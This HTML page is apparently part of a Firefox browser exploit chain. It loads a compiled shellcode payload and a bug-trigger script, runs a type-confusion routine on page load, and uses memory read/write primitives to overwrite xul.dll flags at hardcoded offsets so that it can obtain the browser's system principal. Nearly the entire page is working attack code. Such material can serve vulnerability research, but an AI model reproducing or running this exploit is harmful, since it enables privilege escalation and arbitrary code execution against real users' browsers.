<html>
<body>
<head>
<meta content="text/html;charset=utf-8" http-equiv="Content-Type">
<meta content="utf-8" http-equiv="encoding">
<script src="./../Payloads/Compiled/JS/WinExecSleep_Uint8Array_64-bit.js">
</script>
<script src="./../Payloads/Compiled/JS/Bug.js">
</script>
<script>

function run()
{

    if( window.netscape.security.PrivilegeManager == undefined )
    {
        try{
            confusion();    //if it didn't work reload the page 
        }                   //(sometimes the confusion does not get triggeret on first load)
        catch (error) {}
        finally{
            location.reload();
        }
    }else{
		InitStrongReadPrimitive();
		
		HelperDbl[0] = LeakedXulAddress;
		HelperDword[0] = HelperDword[0] + 0x05034e1b;
		let sAutomationPrefIsSet  = HelperDbl[0]; 
		StrongWriteDword(sAutomationPrefIsSet, 0x1);


		HelperDbl[0] = LeakedXulAddress;
		HelperDword[0] = HelperDword[0] + 0x05034E1c;
		let sPrefCacheAdded  = HelperDbl[0]; 
		StrongWriteDword(sPrefCacheAdded, 0x1);

		HelperDbl[0] = LeakedXulAddress;
		HelperDword[0] = HelperDword[0] + 0x04fe4dc3;
		let disabledForTest  = HelperDbl[0]; 
		StrongWriteDword(disabledForTest, 0x1);
		
		const { Services } = Components.utils.import('resource://gre/modules/Services.jsm');
		
		systemPrincipal = Services.scriptSecurityManager.getSystemPrincipal();

		if(systemPrincipal) {
			alert("successfully obtained system principal");
		}
		else {
			alert("failed to obtain system principal");
		}
    }
}

function _GetDocShellFromWindow(Win) {
    return Win.docShell;
}

</script>
</head>
<body>
<script type="text/javascript">
    window.addEventListener('load', (event) => { Exploit(); });
</script>
</body>
</html>
